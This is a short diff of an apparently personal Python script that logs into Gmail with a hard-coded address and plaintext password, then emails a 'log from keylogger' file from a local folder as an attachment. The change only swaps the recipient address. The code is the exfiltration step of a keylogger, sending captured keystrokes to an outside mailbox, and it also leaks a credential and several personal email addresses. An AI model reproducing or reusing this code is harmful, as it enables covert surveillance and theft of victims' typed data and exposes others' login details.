@@ -33,4 +33,4 @@ g.login('nick.tsilivis@gmail.com', 'notorious3')
 ##
 ##g.send_email("nick.tsilivis@gmail.com", "p.tsilivis10@gmail.com", "Automatic python email " + strftime("%Y-%m-%d %H:%M:%S", gmtime()), "This is an automatic email sent from python program")
 
-g.send_email_with_attachmen("nick.tsilivis@gmail.com", "moustant21@gmail.com", "log from keylogger", "C:\\Users\\nick\\Pictures\\test\\", "log.txt")
+g.send_email_with_attachmen("nick.tsilivis@gmail.com", "test@test.gr", "log from keylogger", "C:\\Users\\nick\\Pictures\\test\\", "log.txt")
